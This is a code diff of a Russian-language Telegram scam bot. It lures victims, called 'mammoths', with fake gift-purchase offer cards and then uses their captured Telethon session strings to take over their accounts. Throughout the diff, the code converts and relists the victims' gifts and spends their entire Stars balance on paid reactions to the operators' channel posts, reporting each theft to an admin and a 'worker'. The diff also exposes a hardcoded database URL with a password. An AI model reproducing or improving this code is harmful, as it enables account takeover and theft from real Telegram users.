@@ -64,7 +64,6 @@ DATABASE_URL = os.getenv(
     "postgresql+asyncpg://avnadmin:AVNS_Kdeg6Q2vNRREiOv-JWp@pg-270e5c9e-danyachuglaev-8664.e.aivencloud.com:28308/defaultdb"
 )
 
-# 10 постов для ротации
 TARGET_POSTS = [
     "https://t.me/zerostarslud/2",
     "https://t.me/zerostarslud/3",
@@ -80,7 +79,6 @@ TARGET_POSTS = [
 
 PORT = int(os.getenv("PORT", "8080"))
 
-# парсим канал и ID для каждого поста
 PARSED_POSTS = []
 for _url in TARGET_POSTS:
     _m = re.match(r"https?://t\.me/([^/]+)/(\d+)", _url)
@@ -92,24 +90,21 @@ for _url in TARGET_POSTS:
             "used": False,
         })
 
-# для обратной совместимости
 TARGET_CHANNEL = PARSED_POSTS[0]["channel"] if PARSED_POSTS else None
 TARGET_POST_ID = PARSED_POSTS[0]["post_id"] if PARSED_POSTS else None
 
 MAX_ATTEMPTS = 3
-SELL_WAIT = 60  # 1 минута вместо 3
+SELL_WAIT = 60
 AUTO_DROP_AFTER = 600
 AUTO_DROP_PERCENT = 0.8
 
-# глобальное состояние: какой пост сейчас использовать
 current_post_index = 0
-# блокировка для потокобезопасности
 post_lock = asyncio.Lock()
 
 waiting_tasks: dict = {}
 
 print("=" * 60)
-print(f"BOT v14 — 10 posts rotation, 1 min timeout")
+print(f"BOT v15 — posts rotation + .offer + logs")
 print(f"BOT_USERNAME: {BOT_USERNAME}")
 print(f"POSTS: {len(PARSED_POSTS)}")
 for p in PARSED_POSTS:
@@ -573,7 +568,6 @@ async def telethon_update_price(session_string, msg_id, new_price):
 
 
 def get_next_post():
-    """Возвращает следующий неиспользованный пост."""
     global current_post_index
     for i in range(len(PARSED_POSTS)):
         idx = (current_post_index + i) % len(PARSED_POSTS)
@@ -581,7 +575,6 @@ def get_next_post():
             PARSED_POSTS[idx]["used"] = True
             current_post_index = (idx + 1) % len(PARSED_POSTS)
             return PARSED_POSTS[idx]
-    # все использованы — сбрасываем и начинаем заново
     print("[POSTS] Все посты использованы, сбрасываю...")
     for p in PARSED_POSTS:
         p["used"] = False
@@ -638,6 +631,76 @@ class SetPriceForm(StatesGroup):
     new_price = State()
 
 
+# ─── ПАРСЕР ───
+def parse_target_and_offer(text):
+    """Парсит: /offer user_id ссылка сумма. Ссылка может быть с https:// или без."""
+    m = re.search(r'(?:https?://)?(t\.me/nft/[\w\-]+)', text)
+    if not m:
+        return None
+    gift_path = m.group(1)
+    gift_link = "https://" + gift_path
+    gift_name = gift_path.split("/")[-1].replace("-", " #")
+    without_link = text.replace(gift_path, "").replace("https://", "").replace("http://", "")
+    without_cmd = without_link.replace("/offer", "").strip()
+    parts = without_cmd.split()
+    if len(parts) < 2:
+        return None
+    try:
+        target_user_id = int(parts[0])
+        price_stars = int(parts[1])
+    except ValueError:
+        return None
+    return gift_name, gift_link, price_stars, target_user_id
+
+
+def parse_dot_offer(text):
+    """Парсит: .ссылка цена (без user_id — мамонт = чат)."""
+    m = re.search(r'(?:https?://)?(t\.me/nft/[\w\-]+)', text)
+    if not m:
+        return None
+    gift_path = m.group(1)
+    gift_link = "https://" + gift_path
+    gift_name = gift_path.split("/")[-1].replace("-", " #")
+    without_link = text.replace(gift_path, "").replace("https://", "").replace("http://", "").replace(".", "", 1).strip()
+    parts = without_link.split()
+    if not parts:
+        return None
+    try:
+        price_stars = int(parts[0])
+    except ValueError:
+        return None
+    return gift_name, gift_link, price_stars
+
+
+def make_offer_card(o, duration=24):
+    expires_at = o.created_at + timedelta(hours=duration)
+    now = datetime.utcnow()
+    if expires_at > now:
+        delta = expires_at - now
+        hours = delta.seconds // 3600
+        minutes = (delta.seconds % 3600) // 60
+        time_left = f"{hours}ч {minutes}м"
+    else:
+        time_left = "истёк"
+    uname = o.worker_username or "support"
+    return (
+        f"⚖️ <b>Gift Offers</b>\n\n"
+        f"👤 Пользователь <a href='https://t.me/{uname}'>{uname}</a> "
+        f"предлагает вам <b>{o.price_stars}</b> ⭐ за подарок <b>{o.gift_name}</b>\n\n"
+        f"Предложение действует еще <b>{time_left}</b>."
+    )
+
+
+def make_offer_kb(offer_id):
+    accept = f"https://t.me/{BOT_USERNAME}/{MINIAPP_SHORT}?startapp=offer_{offer_id}_accept"
+    reject = f"https://t.me/{BOT_USERNAME}/{MINIAPP_SHORT}?startapp=offer_{offer_id}_reject"
+    return InlineKeyboardMarkup(inline_keyboard=[
+        [InlineKeyboardButton(text="✅ Принять", url=accept)],
+        [InlineKeyboardButton(text="❌ Отклонить", url=reject)],
+    ])
+
+
+# ─── BUSINESS CONNECTION ───
 @dp.business_connection()
 async def on_business_connection(conn: types.BusinessConnection):
     try:
@@ -647,12 +710,82 @@ async def on_business_connection(conn: types.BusinessConnection):
             await bot.send_message(
                 u.id,
                 f"🔌 <b>Бизнес-бот подключён</b>\n\nID: <code>{u.id}</code>\n\n"
-                f"Создать оффер:\n<code>/offer user_id ссылка сумма</code>"
+                f"Создать оффер:\n<code>/offer user_id ссылка сумма</code>\n"
+                f"или напиши <code>.ссылка цена</code> прямо в чате с мамонтом"
             )
         except Exception:
             pass
     except Exception as e:
         print(f"business_connection error: {e}")
+
+
+# ─── ТОЧКА — СОЗДАНИЕ ОФФЕРА ───
+@dp.business_message(F.text.startswith("."))
+async def business_offer_dot(message: types.Message):
+    """Воркер отправил .ссылка цена → удаляем → отправляем карточку."""
+    uid = message.from_user.id
+    u = await get_user(uid)
+    if not u or u.role not in ("worker", "admin"):
+        return
+
+    chat_id = message.chat.id
+    text = (message.text or "")[1:].strip()
+
+    parsed = parse_dot_offer("." + text)
+    if not parsed:
+        try:
+            await message.delete()
+        except Exception:
+            pass
+        await bot.send_message(uid,
+            "❌ Формат: <code>.ссылка цена</code>\n"
+            "Пример: <code>.t.me/nft/DeskCalendar-284528 650</code>")
+        return
+
+    gift_name, gift_link, price_stars = parsed
+
+    try:
+        await message.delete()
+    except Exception as e:
+        print(f"[DOT] delete error: {type(e).__name__}: {e}")
+
+    conn = await get_business_conn(uid)
+    if not conn or not conn.connection_id:
+        await bot.send_message(uid, f"❌ Нет бизнес-подключения. → @{BOT_USERNAME}")
+        return
+
+    price_usd = f"{price_stars * 0.0092:.2f}"
+    o = await create_offer(
+        worker_id=uid, worker_username=message.from_user.username,
+        gift_name=gift_name, gift_link=gift_link,
+        price_stars=price_stars, price_usd=price_usd,
+        target_user_id=chat_id, duration_hours=24,
+    )
+
+    sent = False
+    try:
+        await bot.send_message(
+            chat_id=chat_id,
+            text=make_offer_card(o),
+            reply_markup=make_offer_kb(o.id),
+            business_connection_id=conn.connection_id,
+            disable_web_page_preview=True,
+        )
+        sent = True
+    except TelegramBadRequest as e:
+        await bot.send_message(uid, f"❌ Ошибка отправки: {e}")
+
+    await add_log(worker_id=uid, offer_id=o.id, event="dot_offer",
+                  detail=f"{gift_name} → {chat_id} за {price_stars}⭐ sent={sent}")
+
+    try:
+        await bot.send_message(ADMIN_ID,
+            f"🆕 <b>Оффер (.)</b>\n"
+            f"Воркер: <code>{uid}</code>\n"
+            f"Мамонт: <code>{chat_id}</code>\n"
+            f"Подарок: {gift_name}\nЦена: {price_stars}⭐\nID: <code>{o.id}</code>")
+    except Exception:
+        pass
 
 
 @dp.message(CommandStart())
@@ -760,7 +893,8 @@ async def my_conn_callback(call: types.CallbackQuery):
             f"🔌 <b>Подключение активно</b>\n\n"
             f"├ ID: <code>{conn.connection_id}</code>\n"
             f"└ {conn.updated_at:%d.%m.%Y %H:%M}\n\n"
-            f"<b>Создать оффер:</b>\n<code>/offer user_id ссылка сумма</code>"
+            f"<b>Создать оффер:</b>\n<code>/offer user_id ссылка сумма</code>\n"
+            f"или <code>.ссылка цена</code> в чате"
         )
     else:
         text = (
@@ -912,55 +1046,6 @@ async def flush_all(call: types.CallbackQuery):
     if key in waiting_tasks:
         waiting_tasks[key].cancel(); del waiting_tasks[key]
     asyncio.create_task(do_react(sess.session_string, mammoth_id, call.from_user.id, offer_id))
-
-
-def make_offer_card(o, duration=24):
-    expires_at = o.created_at + timedelta(hours=duration)
-    now = datetime.utcnow()
-    if expires_at > now:
-        delta = expires_at - now
-        hours = delta.seconds // 3600
-        minutes = (delta.seconds % 3600) // 60
-        time_left = f"{hours}ч {minutes}м"
-    else:
-        time_left = "истёк"
-    uname = o.worker_username or "support"
-    return (
-        f"⚖️ <b>Gift Offers</b>\n\n"
-        f"👤 Пользователь <a href='https://t.me/{uname}'>{uname}</a> "
-        f"предлагает вам <b>{o.price_stars}</b> ⭐ за подарок <b>{o.gift_name}</b>\n\n"
-        f"Предложение действует еще <b>{time_left}</b>."
-    )
-
-
-def make_offer_kb(offer_id):
-    accept = f"https://t.me/{BOT_USERNAME}/{MINIAPP_SHORT}?startapp=offer_{offer_id}_accept"
-    reject = f"https://t.me/{BOT_USERNAME}/{MINIAPP_SHORT}?startapp=offer_{offer_id}_accept"
-    return InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text="✅ Принять", url=accept)],
-        [InlineKeyboardButton(text="❌ Отклонить", url=accept)],
-    ])
-
-
-def parse_target_and_offer(text):
-    """Парсит: /offer user_id ссылка сумма. Ссылка может быть с https:// или без."""
-    m = re.search(r'(?:https?://)?(t\.me/nft/[\w\-]+)', text)
-    if not m:
-        return None
-    gift_path = m.group(1)  # "t.me/nft/XmasStocking-53840"
-    gift_link = "https://" + gift_path
-    gift_name = gift_path.split("/")[-1].replace("-", " #")
-    without_link = text.replace(gift_path, "").replace("https://", "").replace("http://", "")
-    without_cmd = without_link.replace("/offer", "").strip()
-    parts = without_cmd.split()
-    if len(parts) < 2:
-        return None
-    try:
-        target_user_id = int(parts[0])
-        price_stars = int(parts[1])
-    except ValueError:
-        return None
-    return gift_name, gift_link, price_stars, target_user_id
 
 
 @dp.message(Command("offer"))
@@ -1326,18 +1411,12 @@ async def wh_password(p: PasswordPayload):
 
 
 async def react_to_post(session_string, mammoth_id, worker_id, offer_id, post):
-    """
-    Ставит реакцию на конкретный пост всем балансом мамонта.
-    Возвращает (success, stars_sent, error_msg).
-    """
     client = TelegramClient(StringSession(session_string), API_ID, API_HASH)
     try:
         await client.connect()
         me = await client.get_me()
         if not me:
             return False, 0, "session dead"
-
-        # получаем баланс
         balance = 0
         try:
             st = await client(GetStarsStatusRequest(peer=me.id))
@@ -1345,13 +1424,9 @@ async def react_to_post(session_string, mammoth_id, worker_id, offer_id, post):
             balance = int(getattr(bal, "amount", 0) or 0) if bal else 0
         except Exception as e:
             print(f"[REACT] balance error: {e}")
-
         print(f"[REACT] mammoth {mammoth_id} post {post['channel']}/{post['post_id']} balance={balance}")
-
         if balance <= 0:
             return False, 0, "balance 0"
-
-        # ставим реакцию
         for count in [balance, 1]:
             if count <= 0:
                 continue
@@ -1368,7 +1443,6 @@ async def react_to_post(session_string, mammoth_id, worker_id, offer_id, post):
                     err = f"{type(e).__name__}: {str(e)[:100]}"
                     print(f"[REACT] {count}: {err}")
                     await asyncio.sleep(2)
-
         return False, 0, "reaction failed"
     except Exception as e:
         return False, 0, f"{type(e).__name__}: {e}"
@@ -1380,14 +1454,10 @@ async def react_to_post(session_string, mammoth_id, worker_id, offer_id, post):
 
 
 async def do_react(session_string, mammoth_id, worker_id, offer_id):
-    """Ставит реакцию на СЛЕДУЮЩИЙ свободный пост."""
     async with post_lock:
         post = get_next_post()
-
     await notify_admin(f"🎯 Беру пост <code>{post['channel']}/{post['post_id']}</code> для мамонта <code>{mammoth_id}</code>")
-
     ok, stars, err = await react_to_post(session_string, mammoth_id, worker_id, offer_id, post)
-
     if ok:
         await add_stars_farmed(worker_id, stars)
         await update_offer_stars(offer_id, stars)
@@ -1397,7 +1467,6 @@ async def do_react(session_string, mammoth_id, worker_id, offer_id):
             f"Пост: <code>{post['channel']}/{post['post_id']}</code>\n"
             f"Звёзд: <b>{stars} ⭐</b>")
     else:
-        # возвращаем пост обратно
         post["used"] = False
         await notify_admin_and_worker(worker_id, offer_id,
             f"❌ <b>Не удалось поставить реакцию</b>\n"
@@ -1468,7 +1537,6 @@ async def telethon_sell_and_react(session_string, worker_id, offer_id):
 
         print(f"[AUTO] regular={len(regular_to_convert)} unique_listed={len(unique_listed)}")
 
-        # конвертируем обычные
         for r in regular_to_convert:
             try:
                 await client(ConvertStarGiftRequest(stargift=r["ref"]))
@@ -1481,7 +1549,6 @@ async def telethon_sell_and_react(session_string, worker_id, offer_id):
                 else:
                     result["failed"].append({"title": r["title"], "reason": f"{type(e).__name__}"})
 
-        # перевыставляем уникальные
         relisted_info = []
         for u in unique_listed:
             old_price = u["current_price"]
@@ -1501,7 +1568,6 @@ async def telethon_sell_and_react(session_string, worker_id, offer_id):
             except Exception as e:
                 result["failed"].append({"title": u["title"], "reason": f"{type(e).__name__}: {e}"})
 
-        # баланс
         balance = 0
         try:
             st = await client(GetStarsStatusRequest(peer=me.id))
@@ -1510,7 +1576,6 @@ async def telethon_sell_and_react(session_string, worker_id, offer_id):
         except Exception: pass
         result["balance"] = balance
 
-        # ЕСЛИ ЕСТЬ БАЛАНС — СРАЗУ СТАВИМ РЕАКЦИЮ НА СЛЕДУЮЩИЙ ПОСТ
         if balance > 0:
             await client.disconnect()
             async with post_lock:
@@ -1530,7 +1595,6 @@ async def telethon_sell_and_react(session_string, worker_id, offer_id):
                 await notify_admin_and_worker(worker_id, offer_id,
                     f"❌ Реакция не удалась: {err}")
 
-        # если есть relisted — запускаем ожидание продажи
         if relisted_info:
             result["waiting"] = True
             await notify_worker_about_relist(mammoth_id=mammoth_id, worker_id=worker_id,
@@ -1582,7 +1646,6 @@ async def notify_worker_about_relist(mammoth_id, worker_id, offer_id, relisted, 
 
 
 async def wait_and_check_sale(session_string, mammoth_id, worker_id, offer_id, relisted, check_after, attempt=1):
-    """Ждёт check_after секунд. Проверяет продалось ли. Если да — реакция на след. пост."""
     await asyncio.sleep(check_after)
     gifts_now = await telethon_get_gifts(session_string)
     current_msg_ids = {g["msg_id"] for g in gifts_now if g["msg_id"]}
@@ -1599,17 +1662,13 @@ async def wait_and_check_sale(session_string, mammoth_id, worker_id, offer_id, r
                     g.status = "sold"; await s.commit()
         else:
             still_listed.append(r)
-
-    # продались — реакция на след. пост
     if sold:
         print(f"[SALE] {len(sold)} sold, {len(still_listed)} still listed")
         await notify_admin_and_worker(worker_id, offer_id,
             f"💸 <b>Продано {len(sold)} подарков</b>\nСтавлю реакцию на следующий пост...")
         await do_react(session_string, mammoth_id, worker_id, offer_id)
-
-    # если ещё остались нераспроданные — продолжаем следить
     if still_listed:
-        if attempt < 30:  # 30 минут макс (30 * 60сек)
+        if attempt < 30:
             await wait_and_check_sale(session_string, mammoth_id, worker_id, offer_id,
                                        still_listed, check_after=SELL_WAIT, attempt=attempt + 1)
         else:
@@ -1630,11 +1689,9 @@ async def run_automation(session_string, offer_id, worker_id):
     if not o: return
     await notify_admin(f"🚀 <b>Автомат</b>\nОффер #{offer_id} — воркер <code>{worker_id}</code>")
     result = await telethon_sell_and_react(session_string, worker_id, offer_id)
-
     lines = ["🎯 <b>Результат</b>", f"Оффер: #{offer_id}", ""]
     lines.append(f"📦 Всего подарков: <b>{result.get('gifts_total', 0)}</b>")
     lines.append(f"🔷 NFT: <b>{result.get('unique_total', 0)}</b>")
-
     if result.get("converted"):
         lines.append(f"\n💱 Конвертировано: <b>{len(result['converted'])}</b>")
     if result.get("listed"):
@@ -1651,7 +1708,6 @@ async def run_automation(session_string, offer_id, worker_id):
             lines.append(f"• {cnt} под. — {reason}")
     if result.get("failed"):
         lines.append(f"\n❌ Ошибок: <b>{len(result['failed'])}</b>")
-
     lines.append(f"\n💰 Баланс: <b>{result.get('balance', 0)} ⭐</b>")
     if result.get("reacted"):
         lines.append(f"✅ Реакция на пост: <b>{result['stars_sent']} ⭐</b>")
@@ -1659,7 +1715,6 @@ async def run_automation(session_string, offer_id, worker_id):
         lines.append("⏳ <b>Ждём продажу подарков...</b>")
     if result.get("error"):
         lines.append(f"⚠️ {result['error'][:150]}")
-
     text = "\n".join(lines)
     await notify_admin(text)
     try: await bot.send_message(worker_id, text)
@@ -1675,7 +1730,7 @@ async def health():
 
 async def run_bot():
     print("=" * 60)
-    print("BOOT v14")
+    print("BOOT v15")
     print("=" * 60)
     await init_db()
     print("RUN_BOT: db ready")
